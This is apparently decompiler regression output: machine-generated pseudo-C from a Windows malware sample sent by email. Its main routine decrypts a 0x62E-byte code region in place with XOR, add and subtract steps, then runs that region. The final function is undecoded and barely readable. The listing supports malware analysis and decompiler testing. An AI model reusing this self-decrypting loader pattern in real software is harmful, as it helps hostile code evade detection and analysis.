// subject.c
// Generated on 5/4/2015 12:14:14 AM by decompiling malware_via_email/malware_0034/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 esi)
{
	word32 edx_15;
	word32 ecx_16 = fn00401078(0x00401148, 0x0000062E, out edx_15);
	fn00401148(ecx_16, edx_15, fp - 0x00000004, esi);
	word32 edx_35;
	fn00401078(0x00401148, 0x0000062E, out edx_35);
	if (false)
	{
		Mem48[fp - 0x00000018:word32] = 0x00405000;
		Mem50[fp - 0x0000001C:word32] = 0x00401000;
		lstrcpyA(Mem50[fp - 0x0000001C:LPSTR], Mem50[fp - 24:LPCSTR]);
	}
	return;
}

word32 fn00401078(word32 dwArg04, word32 dwArg08, ptr32 edxOut)
{
	*edxOut = edx;
	word32 dwLoc08_22 = 0x00000000;
	while (dwLoc08_22 < dwArg08)
	{
		if (dwLoc08_22 > 0x00000001 && (dwLoc08_22 - 0x00000001 & 0x00000001) == 0x00000000)
		{
			word32 eax_153 = dwLoc08_22 + dwArg04;
			word32 edx_150 = dwArg04 + dwLoc08_22;
			*edxOut = edx_150;
			Mem161[edx_150 + 0x00000000:byte] = (byte) (DPB(eax_153, Mem0[eax_153 + 0x00000000:byte], 0, 8) ^ 0x0000001E);
		}
		if (dwLoc08_22 > 0x00000001)
		{
			word32 edx_114 = dwLoc08_22 - 0x00000001;
			word64 edx_eax_119 = SEQ(edx_114 >> 0x0000001F, edx_114);
			ecx = 0x00000003;
			word32 edx_120;
			*edxOut = edx_eax_119 % 0x00000003;
			if (edx_eax_119 % 0x00000003 == 0x00000000)
			{
				word32 eax_133 = dwLoc08_22 + dwArg04;
				word32 edx_130 = dwArg04 + dwLoc08_22;
				*edxOut = edx_130;
				Mem140[edx_130 + 0x00000000:byte] = (byte) (DPB(eax_133, Mem0[eax_133 + 0x00000000:byte], 0, 8) + 0x00000038);
			}
		}
		if (dwLoc08_22 > 0x00000003)
		{
			word32 edx_86 = dwLoc08_22 - 0x00000003;
			word64 edx_eax_91 = SEQ(edx_86 >> 0x0000001F, edx_86);
			ecx = 0x00000003;
			word32 edx_92;
			*edxOut = edx_eax_91 % 0x00000003;
			if (edx_eax_91 % 0x00000003 == 0x00000000)
			{
				word32 eax_105 = dwLoc08_22 + dwArg04;
				word32 edx_102 = dwArg04 + dwLoc08_22;
				*edxOut = edx_102;
				Mem112[edx_102 + 0x00000000:byte] = (byte) (DPB(eax_105, Mem0[eax_105 + 0x00000000:byte], 0, 8) - 0x0000007A);
			}
		}
		if ((dwLoc08_22 & 0x00000001) == 0x00000000)
		{
			ecx = dwArg04 + dwLoc08_22;
			Mem84[ecx + 0x00000000:byte] = Mem0[dwLoc08_22 + dwArg04:byte] - (byte) dwLoc08_22;
			word32 edx_77;
			*edxOut = dwLoc08_22;
		}
		dwLoc08_22 = dwLoc08_22 + 0x00000001;
	}
	return ecx;
}

void fn00401148(word32 ecx, word32 edx, word32 ebp, word32 esi)
{
fn00401148_entry:
l00401148:
	branch ecx == 0x00000000 l004011A2
l00401153:
	__fldcw(Mem0[ebp + 0x0000005E:word16])
	branch SLICE(0x00000000[(fp - 0x00000004) * 0xED1FD996], byte, 8) - bLoc0F == 0x00 && DPB(0x08D68696, (bLoc2482ECAB + 0x96) + C, 0, 8) != 0x00000001 l00401194
l0040117F:
l00401194:
l004011A2:
fn00401148_exit:
}

